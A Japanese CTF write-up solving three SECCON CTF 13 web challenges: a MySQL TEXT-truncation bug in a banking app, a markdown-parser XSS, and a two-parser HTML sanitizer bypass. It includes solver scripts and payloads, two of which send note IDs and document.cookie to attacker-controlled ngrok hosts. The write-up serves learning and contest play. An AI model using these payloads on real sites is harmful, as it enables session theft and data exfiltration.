---
title: "SECCON CTF 13 - writeup"
date: "2024-11-28T00:00:00.000Z"
lang: JA
---

## ✅ Trillion Bank (108pts 84solves)
![](/assets/blog/seccon13/b41654fde056-20241125.png)

他のユーザーとの間で送金が可能なサイト。ユーザー登録すると10円(?)もらえるので、これを1兆円することでフラグがもらえる。

### 問題設定

ユーザー登録をしている`/api/register`のコードは以下の通り。

```javascript:index.js
app.post("/api/register", async (req, res) => {
  const name = String(req.body.name);
  if (!/^[a-z0-9]+$/.test(name)) {
    res.status(400).send({ msg: "Invalid name" });
    return;
  }
  if (names.has(name)) {
    res.status(400).send({ msg: "Already exists" });
    return;
  }
  names.add(name);

  const [result] = await db.query("INSERT INTO users SET ?", {
    name,
    balance: 10,
  });
  res
    .setCookie("session", await res.jwtSign({ id: result.insertId }))
    .send({ msg: "Succeeded" });
});
```

* `names`という配列にユーザー名の一覧を保存しており、ユーザー名に重複がないかチェックしている
* 重複がない場合、データベースに10円を所有した状態で保存される
* セッションとして、cookieにjwtにidを保存する

ユーザーからユーザーにお金を送る`/api/transfer`のコードは以下の通り。

```javascript:index.js
app.post("/api/transfer", { onRequest: auth }, async (req, res) => {
  const recipientName = String(req.body.recipientName);
  if (!names.has(recipientName)) {
    res.status(404).send({ msg: "Not found" });
    return;
  }

  const [{ 0: { id } }] = await db.query("SELECT * FROM users WHERE name = ?", [recipientName]);
  if (id === req.user.id) {
    res.status(400).send({ msg: "Self-transfer is not allowed" });
    return;
  }

  const amount = parseInt(req.body.amount);
  if (!isFinite(amount) || amount <= 0) {
    res.status(400).send({ msg: "Invalid amount" });
    return;
  }

  const conn = await db.getConnection();
  try {
    await conn.beginTransaction();

    const [{ 0: { balance } }] = await conn.query("SELECT * FROM users WHERE id = ? FOR UPDATE", [
      req.user.id,
    ]);
    if (amount > balance) {
      throw new Error("Invalid amount");
    }

    await conn.query("UPDATE users SET balance = balance - ? WHERE id = ?", [
      amount,
      req.user.id,
    ]);
    await conn.query("UPDATE users SET balance = balance + ? WHERE name = ?", [
      amount,
      recipientName,
    ]);

    await conn.commit();
  } catch (err) {
    await conn.rollback();
    return res.status(500).send({ msg: err.message });
  } finally {
    db.releaseConnection(conn);
  }

  res.send({ msg: "Succeeded" });
});
```
* bodyから送り先ユーザー名である`recipientName`を参照し、それが`names`に含まれるかチェックする
* `recipientName`の`id`をデータベースから取得し、それがリクエストを送ったユーザー自身でないことを確認する
* 送る金額が正当であることを確認する
    * `NaN`や`Infinate`のような数は送れない(参考: [MDN - isFinite()](https://developer.mozilla.org/ja/docs/Web/JavaScript/Reference/Global_Objects/isFinite))
    * 負の数の量は送れない
* トランザクション開始。何かの理由によりうまく行かなかった場合、以下はロールバックされる
    * 送り元ユーザーが`balance`に所有している金額より多くは送れない
    * 送り元ユーザーの`balance`から指定の量を引く
    * 送り先ユーザーの`balance`に指定の量を足す

ユーザーを管理するDBのスキーマは次の通り。
```SQL
CREATE TABLE users (
    id INT AUTO_INCREMENT NOT NULL,
    name TEXT NOT NULL,
    balance BIGINT NOT NULL,
    PRIMARY KEY (id)
)
```
* `id`はユーザーごとに重複がなく自動で付与される
* `name`は任意の文字列
* `balance`は最大64ビットの整数値

### 解法 

ユーザーを作成する度に10円もらえるので、1000億ユーザー作成してすべて一つのユーザーに送ればよいが、1秒に100ユーザー作成できたとしても10億秒=317年かかってしまう。15分ごとにサーバーがリセットされるというアナウンスにもあるとおり、ユーザー作成を自動化するだけではクリアできなさそう。

気になる点として、ユーザー名の重複チェックが`names`という配列を通してインメモリで行われているという点である。もし重複を防ぎたいだけならば、データベースのスキーマで`UNIQUE`制約をつければいいだけである。

しかも次のSQLは、`LIMIT 1`となっていないので、重複したユーザー名のユーザーが存在すれば、そのすべてのユーザーにお金を送ることができる。
```SQL
UPDATE users SET balance = balance + ? WHERE name = ?
```

ユーザー名の`TEXT`型の[ドキュメント](https://dev.mysql.com/doc/refman/8.0/ja/blob.html)を読むと次のように書いてあった。
> 厳密な SQL モードが有効でない場合に、BLOB または TEXT カラムにその最大長を超える値を割り当てると、その値はカラムの最大長に合わせて切り捨てられ、警告メッセージが表示されます。

`TEXT`の最大の長さは[65535バイトである](https://dev.mysql.com/doc/refman/8.0/ja/column-count-limit.html#:~:text=%E3%82%B9%E3%83%88%E3%83%AC%E3%83%BC%E3%82%B8%E3%82%A8%E3%83%B3%E3%82%B8%E3%83%B3%E3%81%8C%E3%82%88%E3%82%8A%E5%A4%A7%E3%81%8D%E3%81%AA,%E6%A0%BC%E7%B4%8D%E3%81%95%E3%82%8C%E3%82%8B%E3%81%9F%E3%82%81%E3%81%A7%E3%81%99%E3%80%82)ので、それ以降の文字は無視されるということがわかる。

このことを利用して、次のような解法を考えた

1. 次の10のユーザーと、メインユーザー`X`を作成する。

    ```
      65535バイト
    --------------
    AAA.........AA
    AAA.........AA0
    AAA.........AA1
    <省略>
    AAA.........AA8
    ```

    そうすると、これらの値はすべて異なるため`names`を利用したチェックでは重複せず、ユーザーの作成が成功する。ただし、65535バイト以降は切り捨てられるため、ユーザー名はすべて`AAA.........AA`となる。

2. `X`から`AAA.........AA`に対して`/api/transfer`で10円送信を行うと、次のSQLが実行される。
    ```SQL
    UPDATE users SET balance = balance + 10 WHERE name = AAA.........AA
    ```
    これは、上記の10ユーザーすべてに当てはまるので、10ユーザーの残高は20円となる。

3. 送られた10ユーザーから`X`に20円送り返す。結果的に、`X`の残高は200円となる。
4. 1~3を繰り返すと、`X`の残高が2000円、20000円...と10倍ずつになっていくので、11回繰り返すと`X`の残高が2兆になる。
5. `/api/me`にアクセスし、フラグ入手。


::: details 失敗したアプローチ(race condition)

このような問題でありがちなのは、race conditionだ。ユーザーA(送り元)ユーザーB1、B2(送り先)の3ユーザーを作成して、ユーザーA→ユーザーB1の送信(リクエスト1)とユーザーA→ユーザーB2(リクエスト2)の送信をほぼ同時に行う。そうすると、タイミングが良ければ次のような動作になるかもと考えた。

1. (リクエスト1)ユーザーAの`balance`が10円以上であることを確認する
2. (リクエスト2)ユーザーAの`balance`が10円以上であることを確認する
3. (リクエスト1)ユーザーAの`balance`から10円引き、ユーザーB1の`balance`に10円足す
4. (リクエスト2)ユーザーAの`balance`から10円引き、ユーザーB2の`balance`に10円足す

結果的に、ユーザーAの`balance`は-10となり、ユーザーB1とユーザーB2の`balance`は20ずつとなる。倍々に増やすことができるので、効率よくお金を貯めることができる、というアプローチである。

今回これがうまくいかないのは、「10円以上であることを確認」「`balance`から指定の量を引く」「`balance`に指定の量を足す」の動作が同一トランザクションで行われており、これらが完了するまでほかのデータベース操作は待機状態になってしまうからである(Atomicity)。

```javascript:index.js
app.post("/api/transfer", { onRequest: auth }, async (req, res) => {
  /* snap */
  try {
    await conn.beginTransaction(); // トランザクション開始

    const [{ 0: { balance } }] = await conn.query("SELECT * FROM users WHERE id = ? FOR UPDATE", [
      req.user.id,
    ]);
    if (amount > balance) {
      throw new Error("Invalid amount");
    }

    await conn.query("UPDATE users SET balance = balance - ? WHERE id = ?", [
      amount,
      req.user.id,
    ]);
    await conn.query("UPDATE users SET balance = balance + ? WHERE name = ?", [
      amount,
      recipientName,
    ]);

    await conn.commit(); // トランザクションを終了
  } catch (err) {
    await conn.rollback(); // トランザクションがうまく行かなかったので、開始前の状態にロールバック
  /* snap */
});
```
:::

### 最終的なコード

```python:solver.py
import requests
import random
import string

  
URL = "http://trillion.seccon.games:3000/"

# 失敗したときに繰り返し実行できるように、すべてのユーザーの最初の8文字はランダムに
key = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))

def transfer(s, amount, to):
  print("transfer", amount, to[-10:])
  while True:
    # 何かしらの理由で失敗したら成功するまで繰り返す
    try:
      r = s.post(URL + "api/transfer", json={
        "amount": amount,
        "recipientName": to
      })
      print(r.status_code)
      print(r.text)
      if r.status_code == 200:
        break
    except:
      pass

# メインのユーザー作成
username = key + "tchen"

s1 = requests.session()
r = s1.post(URL + "api/register", json={
  "name": username
})
print(r.text)

# DBで重複した名前のユーザー作成
sess = []
prefix = (key + "y" * 65535)[:65535]
s2 = requests.session()
r = s2.post(URL + "api/register", json={
  "name": prefix
})

for i in range(10):
  s = requests.session()
  sess.append(s)
  r = s.post(URL + "api/register", json={
    "name": prefix + str(i)
  })
  print(r.text)


# 一回目の送信(最初だけ10円なので特別扱い)
transfer(s1, 10, prefix)

# 送り戻す
for s in sess:
  transfer(s, 20, username)

# 1兆を超えるまで繰り返し
cur = 200
while cur < 1_000_000_000_000:

  transfer(s1, cur, prefix)
  for s in sess:
    transfer(s, cur, username)
  cur *= 10
  
# フラグ入手
r = s1.get(URL + "api/me")
print(r.text)
```

## ✅ Tanuki Udon (149pts 41solves)

![](/assets/blog/seccon13/591a035ce730-20241125.png)

マークダウンに(ちょっとだけ)対応したノートを作成できるサイト。

### 問題設定
エンドポイントは次の通り
* `GET /` - ノートの一覧が見れる
* `POST /note` - ノートを作成する
* `GET /note/:noteId` - 指定のIDのノートを見る

POSTしたノートは次のパーサーを利用して、エスケープとmarkdownの整形が行われる。
```javascript:markdown.js
const escapeHtml = (content) => {
  return content
    .replaceAll('&', '&amp;')
    .replaceAll(`"`, '&quot;')
    .replaceAll(`'`, '&#39;')
    .replaceAll('<', '&lt;')
    .replaceAll('>', '&gt;');
}

const markdown = (content) => {
  const escaped = escapeHtml(content);
  return escaped
    .replace(/!\[([^"]*?)\]\(([^"]*?)\)/g, `<img alt="$1" src="$2"></img>`)
    .replace(/\[(.*?)\]\(([^"]*?)\)/g, `<a href="$2">$1</a>`)
    .replace(/\*\*(.*?)\*\*/g, `<strong>$1</strong>`)
    .replace(/  $/mg, `<br>`);
}

module.exports = markdown;
```

また、botが動いており、内容がフラグであるノートを作成した上で指定のURLを読み込んでくれる。

```javascript:bot.mjs
export const visit = async (url) => {
  console.log(`start: ${url}`);

  const browser = await puppeteer.launch({
    headless: "new",
    executablePath: "/usr/bin/chromium",
    args: [
      "--no-sandbox",
      "--disable-dev-shm-usage",
      "--disable-gpu",
      '--js-flags="--noexpose_wasm"',
    ],
  });

  const context = await browser.createBrowserContext();

  try {
    // Create a flag note
    const page1 = await context.newPage();
    await page1.goto(APP_URL, { waitUntil: "networkidle0" });
    await page1.waitForSelector("#titleInput");
    await page1.type("#titleInput", "Flag");
    await page1.waitForSelector("#contentInput");
    await page1.type("#contentInput", FLAG);
    await page1.waitForSelector("#createNote");
    await page1.click("#createNote");
    await sleep(1 * 1000);
    await page1.close();

    // Visit the given URL
    const page2 = await context.newPage();
    await page2.goto(url, { timeout: 3000 });
    await sleep(90 * 1000);
    await page2.close();
  } catch (e) {
    console.error(e);
  }

  await context.close();
  await browser.close();

  console.log(`end: ${url}`);
};
```

セッション管理は以下の通り。`express-session`ではデフォルトの設定で`httpOnly`なので、セッションハイジャックは難しそうである。
```index.js
app.use(session({
  secret: crypto.randomBytes(32).toString('base64'),
  resave: true, 
  saveUninitialized: true, 
}));
```

### 解法

まず、マークダウンでXSSを狙う。タグを記述するのに必要な`&<>"`がフィルタされてしまうので、素直にタグを埋め込んでXSSをすることはできない。そこで、markdownのパースを利用して、パースされたあとにスクリプトが実行されるようなタグを埋め込むことができるか確認する。

まずは、通常どのように整形されるかを確認する。

|整形順|整形前|整形後|
|----|----|----|
|1|`![foo](bar)`|`<img alt="foo" src="bar"></img>`|
|2|`[foo](bar)`|`<a href="bar">foo</a>`|
|3|`**foo**`|`<strong>foo</strong>`|
|4|`foo  \nbar`|`foo<br>\nbar`|

このようなパターンの場合、経験的に先に整形されるケースの中に後に整形されるケースを埋め込むと変な挙動になることが多いことが分かっていたので、次のように実験してどのように埋め込まれるか確認した。

整形前
```
![A[B](C)D](E)
```
整形後
```html
<img alt="A<a href="E">B" src="C"></img>D</a>
```

これをみると、Eの箇所にアトリビュートを記述できることがわかる。

整形前
```
![[]()]( id=foobar )
```
整形後
```html
<img alt="<a href=" id=foobar ">" src=""></img></a>
```

ただし、`()`を利用すると、表示が崩れてしまう。

整形前
```
![[]()]( src=X onerror=alert(1) )
```
```
<img alt="<a href=" src=X onerror=alert(1">" src=""></img></a> )
```

整形後
<div class="code-block-container"><pre class="language-html"><code class="language-html code-line" data-line="398"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">alt</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>&lt;a href=<span class="token punctuation">"</span></span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>X</span> <span class="token attr-name">onerror</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>alert(1"</span><span class="token punctuation">&gt;</span></span>" src=""&gt;&lt;/img&gt;&lt;/a&gt; )
</code></pre></div>

したがって、`()`使用せずにXSSでホーム画面のノートのIDを取得するペイロードを作成したい。

関数は[タグ付きテンプレート](https://developer.mozilla.org/ja/docs/Web/JavaScript/Reference/Template_literals#%E3%82%BF%E3%82%B0%E4%BB%98%E3%81%8D%E3%83%86%E3%83%B3%E3%83%97%E3%83%AC%E3%83%BC%E3%83%88)を利用して呼び出すことができる。たとえば、次のようなコードを試してみる。

```javascript
function test(...args) {
    console.log(args)
}

test`foo ${3} bar ${"bizbaz"}`
```
結果
```javascript
[ [ 'foo ', ' bar' ], 3, "bizbaz" ]
```

文字列の部分が第1引数に含まれており、`${}`で指定した値が第2引数以降に含まれていることがわかる。

これに、[Function.prototype.call](https://developer.mozilla.org/ja/docs/Web/JavaScript/Reference/Global_Objects/Function/call)を組み合わせると、`()`を使わずに好きな引数を入れることができる。この関数を使うと、第1引数が別の用途で使用されるので、引数を一つずつ後ろにずらすことができる。

```javascript
function test(...args) {
    console.log(args)
}

test.call`${3}${"foobar"}`
```
結果
```javascript
[ 3, 'foobar' ]
```

これを利用して、`()"'`のいずれも使用せずに`eval`関数を利用できる。`eval`の引数にも`()"'`を利用できないが、[`\x`を利用した16進数のエスケープシーケンス](https://developer.mozilla.org/ja/docs/Web/JavaScript/Reference/Lexical_grammar#%E3%82%A8%E3%82%B9%E3%82%B1%E3%83%BC%E3%83%97%E3%82%B7%E3%83%BC%E3%82%B1%E3%83%B3%E3%82%B9)を利用することで回避できる。（例: `()` → `\x28\x29`）

実際に実行させるスクリプトは次のことをすればよい。
1. `/`にfetchを行う
2. fetchの結果の文字列から、タイトルが`Flag`であるノートのIDを抽出する
3. 抽出結果を自分で用意したサーバーに送る


※一応非想定解だったみたいです。作問者のSatoooonさんの解説記事楽しみにしてます。

### 最終的なコード
```python:solver.py
import re
import webbrowser
import requests

URL = "http://tanuki-udon.seccon.games:3000/"
# URL = "http://localhost:3000/"
EVIL = "https://xxx.ngrok.app/"

s = requests.session()
title = "x"

# XSSのペイロード
p = f"""
fetch("/")
  .then(x => x.text())
  .then(x => document.location.assign("{EVIL}?"+x.match(/<a href="(.+)">Flag<\\/a>/)[1]))
""".strip()

# \xを利用した16進数のエスケープ
payload = "".join(["\\x" + "{:02x}".format(ord(c)) for c in p])


# ノートの作成
r = s.post(URL + "note", data={
  "title": title,
  "content": "![[]()]( src=X onerror=eval.call`${`%s`}`//)" % payload
})
print(r.text)

# ノートのIDの取得
r = s.get(URL)
id = re.findall(f'<a href="/(.+)">{title}</a>', r.text)[0]
# webbrowser.open(URL + id) # テスト用でブラウザで自動的に開く
# print(URL + id)

# 以下をbotに送る
print("http://web:3000/" + id)
```

## ✅ double-parser (221pts 17solves)

![](/assets/blog/seccon13/a3ee064bc222-20241125.png)

HTMLを送るとページとして表示してくれるサイト。


### 問題設定

送ったペイロードは次のように検証される。

```javascript:index.js
// Do not use dangerous tags.
const validateTags = ($) => {
  const DANGEROUS_TAGS = [
    "script",
    "noscript",
    "iframe",
    "frame",
    "object",
    "embed",
    "template",
    "meta",
    "svg",
    "math",
  ];
  return $(DANGEROUS_TAGS.join(",")).length === 0;
};

const validate = (html0) => {
  if (typeof html0 !== "string") throw "Invalid type";
  if (html0.length > 1024) throw "Too long";
  if (/[^\r\n\x20-\x7e]/.test(html0)) throw "Invalid characters";

  // Parser 1: parse5
  // ref. https://cheerio.js.org/docs/advanced/configuring-cheerio#parsing-html-with-parse5
  const $1 = cheerio.load(html0);
  if (!validateTags($1)) throw "Invalid tags: Parser 1";
  const html1 = $1.html();

  // Parser 2: htmlparser2
  // ref. https://cheerio.js.org/docs/advanced/configuring-cheerio#using-htmlparser2-for-html
  const $2 = cheerio.load(html1, { xml: { xmlMode: false } });
  if (!validateTags($2)) throw "Invalid tags: Parser 2";
  const html2 = $2.html();

  return html2;
};
```
ペイロードの条件は次の通り
1. 長さが1024バイト以下
2. asciiの表示可能な文字のみを含む文字列

また、cheerioとhtmlparser2という２つのパーサーで解釈し、さらに禁止されたタグが含まれていないか確認している。

botは、指定したURLを見てくれるが、そのcookieにフラグが含まれている。
```javascript:bot.js
export const visit = async (url) => {
  /* snap */
  const context = await browser.createBrowserContext();

  try {
    const page = await context.newPage();
    await page.setCookie({
      name: "FLAG",
      value: FLAG,
      domain: APP_HOST,
      path: "/",
    });
    await page.goto(url, { timeout: 3_000 });
    await sleep(5_000);
    await page.close();
  } catch (e) {
    console.error(e);
  }

  await context.close();
  await browser.close();

  console.log(`end: ${url}`);
};
```

XSSを行えば良さそうだが、CSPにより外部のスクリプトの実行やインラインでのスクリプトの実行が禁止されている。([参考](https://developer.mozilla.org/ja/docs/Web/HTTP/CSP))

```javascript
app.get("/", async (req, reply) => {
  try {
    const html = validate(req.query.html ?? defaultHtml);
    reply
      .type("text/html; charset=utf-8")
      .header("Content-Security-Policy", "script-src 'self'")
      .send(html);
  } catch (err) {
    reply.type("text/plain").code(400).send(err);
  }
});
```

### Step 1: htmlparser2

CSPの条件から、とりあえずスクリプトタグを埋め込むことを目標とする。

２つのパーサーがあるので、まずは２つ目から見ていく。htmlparser2のgithubを見ていると、次のような[issue](https://github.com/fb55/htmlparser2/issues/1789)が見つかった。

![](/assets/blog/seccon13/58ab390310be-20241125.png)

「xmpタグ内はテキストとして扱われるべきなのに、普通のタグとして扱われているよ。」というバグである。

HTMLにはタグ内の文字列をテキストとして扱うタグがいくつかある。これらのタグが開始された場合、内部に一見タグに見える文字列があったとしても、自身の閉じタグが見つかるまでの文字列をテキストとして扱う。その代表例として、

* style (内部はCSS)
* script (内部はjavascript)
* xmp
* textarea
* title

※コメント(`<!-- -->`)も同様の挙動をする。

これらのうち、`script`は`validateTags`で禁止されており、`textarea`と`title`についてはhtmlparser2が内部の文字列をHTMLエスケープ(`<>`→`&lt;&gt;`)してしまうことが分かった。`style`だけは、禁止されていなくて内部をエスケープしないタグである。

次のような入力を考える。

```
<xmp><xmp><style></xmp><script src="X"></style></xmp></xmp>
```

ブラウザは次のように解釈する
<div class="code-block-container"><pre class="language-html"><code class="language-html code-line" data-line="627"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>xmp</span><span class="token punctuation">></span></span>
  &lt;xmp&gt;&lt;style&gt; // 文字列
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>xmp</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>X<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
<span class="token comment">&lt;/style&gt;&lt;/xmp&gt;&lt;/xmp&gt; // 不要な閉じタグ</span>
</code></pre></div>

しかし、htmlparser2は次のように解釈する。

<div class="code-block-container"><pre class="language-html"><code class="language-html code-line" data-line="627"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>xmp</span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>xmp</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">></span></span>
      &lt;/xmp&gt;&lt;script src="X"&gt; // CSS
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>xmp</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>xmp</span><span class="token punctuation">></span></span>
</code></pre></div>

このペイロードであれば、htmlparser2がscriptタグを認識しないが、ブラウザがscriptタグを認識するようにできる。


### Step 2: cheerio + htmlparser2

最初は、cheerioもhtmlparser2も誤解するようなペイロードを考えていたが、調べてもcheerioに関する利用できそうなバグ報告は見つからない。0dayの可能性もあったが、傾向からして流石に0dayは出題しないだろうと考え、方針を改める。

上記のようにhtmlparser2に脆弱性があるのであれば、次のようなペイロードが存在するかもしれない。
* 初期状態では、ブラウザもcheerioもscriptタグを認識しない
* htmlparser2は、ペイロードを誤ってパースし、危険なペイロードに書き換える
* 書き換えられたペイロードはブラウザでscriptタグを実行させる

いろいろ試行錯誤した結果、次のペイロードが刺さった
```
<xmp><xmp><a></a id=</xmp><style></xmp><script src="X"></script></style>
```

1. cheerioは最初のペイロードを次のように解釈する。危険タグも見当たらず、形式として正当なので、入力をそのまま次に渡す。

    <div class="code-block-container"><pre class="language-html"><code class="language-html code-line" data-line="627"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>xmp</span><span class="token punctuation">></span></span>
      &lt;xmp&gt;&lt;a&gt;&lt;/a id= // 文字列
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>xmp</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">></span></span>
      &lt;/xmp&gt;&lt;script src="X"&gt;&lt;/script&gt; // CSS
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span></code></pre></div>

2. htmlparser2は次のように解釈する。

    <div class="code-block-container"><pre class="language-html"><code class="language-html code-line" data-line="627"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>xmp</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>xmp</span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a </span><span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>&lt;/xmp</span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">></span></span>
          &lt;/xmp&gt;&lt;script src="X"&gt;&lt;/script&gt; // CSS
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span></code></pre></div>

    閉じタグ内のアトリビュートや閉じタグのないタグは不正のため、htmlparser2はこれらを修正する。

    <div class="code-block-container"><pre class="language-html"><code class="language-html code-line" data-line="627"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>xmp</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>xmp</span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">></span></span>
          &lt;/xmp&gt;&lt;script src="X"&gt;&lt;/script&gt; // CSS
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>xmp</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>xmp</span><span class="token punctuation">></span></span></code></pre></div>


3. ブラウザは次のように解釈する

    <div class="code-block-container"><pre class="language-html"><code class="language-html code-line" data-line="627"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>xmp</span><span class="token punctuation">></span></span>
      &lt;xmp&gt;&lt;a&gt;&lt;/a&gt;&lt;style&gt; // 文字列
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>xmp</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>X<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
    <span class="token comment">&lt;/style&gt;&lt;/xmp&gt;&lt;/xmp&gt; // 不要な閉じタグ</span></code></pre></div>


これで、ブラウザがスクリプトタグを読み込めるようになった。

### Step 3: 外部スクリプトの読み込み

最後にscriptタグを通して、外部スクリプトを読み込まなければならない。CSPは`script-src 'self'`なので、同じサイト内からしかスクリプトを読むことができない。

`/?html=alert(1)`をスクリプトとして読み込むと、
```
<html><head></head><body>alert(1)</body></html>
```
のような結果が返ってきてしまう。もちろん、これはjavascriptとしては不正なので、`alert(1)`は実行されない。

ブラウザ上のjavascriptには、`<!--`から始まる行をコメントとして扱うという[仕様](https://tc39.es/ecma262/2024/#prod-annexB-SingleLineHTMLOpenComment)がある。また、`/?html=<!--foo-->bar`のようにコメントから始めると、
```
<!--foo--><html><head></head><body>bar</body></html>
```
のように結果もコメントからはじまるようになるため、その行を無視することができる。

cheerioもhtmlparser2も、タグ内やタグ間の改行は削除してしまうが、テキスト内の改行は削除しないので、Step 2のペイロードをそのまま利用して

```
<!--a--><xmp><xmp><a></a id=</xmp><style></xmp>
alert(1)//</script></style>
```

のようなペイロードを送ると、
```javascript
<!--a--><html><head></head><body><xmp><xmp><a></a><style></xmp>
alert(1)//</script></style></xmp></xmp></body></html>
```
となる。これは正当なjavascriptのため、`alert(1)`が実行される。

::: details ちなみに
discordで見ていたら、コメント内の改行も削除されないので、次で良かったことが分かった。そらそうだ。

```
<!-- 
alert(1);
//-->
```
:::

あとは、cookieを自分のサーバーに送るコードを埋め込み、そのURLをbotに送ることで、フラグを入手することができた。

### 最終的なコード

```python:solver.py
import webbrowser
import requests
from urllib import parse

URL = "http://double-parser.seccon.games:3000/"
# URL = "http://localhost:3001/"
EVIL = "https://tchenio.ngrok.io/"

s = requests.session()

# スクリプトタグで読み込むjavascriptコード
js = f"""
<!--a--><xmp><xmp><a></a id=</xmp><style></xmp>
document.location.assign('{EVIL}?'+document.cookie)//</script></style>
""".strip()

# ペイロード
html = """
<xmp><xmp><a></a id=</xmp><style></xmp><script src="/?html=%s"></script></style>
""".strip() % parse.quote(js)

# バリデーションに引っかかっていないか確認
r = s.get(URL, params={
  "html": html
})
print(r.text)
print(r.url)
# バリデーションに引っかかっていなければブラウザで開く
if "Invalid" not in r.text:
  webbrowser.open(r.url)
````